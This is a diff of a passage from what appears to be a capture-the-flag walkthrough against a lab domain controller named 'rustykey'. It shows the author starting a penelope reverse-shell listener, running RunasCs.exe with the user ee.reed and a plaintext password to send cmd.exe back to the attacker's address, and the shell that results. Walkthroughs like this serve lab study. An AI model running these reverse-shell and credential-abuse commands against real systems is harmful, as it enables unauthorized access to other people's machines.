@@ -431,10 +431,43 @@ evil-winrm-py PS C:\Temp>
 Ill upload the tool, i just downloaded the release from the github page
 
 ```python
-
+❯❯❯ penelope -p 1337   
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
 
+ill start a listener
 
+```python
+evil-winrm-py PS C:\Temp> .\RunasCs.exe ee.reed Password123! cmd.exe -r 10.10.14.61:1337
+[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
+[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-3ac872$\Default
+```
+
+Then ill run it to get a shell
+
+```python
+❯❯❯ penelope -p 1337   
+[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => DC 10.129.232.127 Microsoft_Windows_Server_2019_Standard-x64-based_PC 👤 rustykey\ee.reed 😍️ Session ID <1>
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC~10.129.232.127-Microsoft_Windows_Server_2019_Standard-x64-based_PC/2026_10_19-17_26_41-960.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32>
+
+C:\Windows\system32>whoami
+whoami
+rustykey\ee.reed
+
+C:\Windows\system32>
+```
+
+I now have a shel
 
 
 
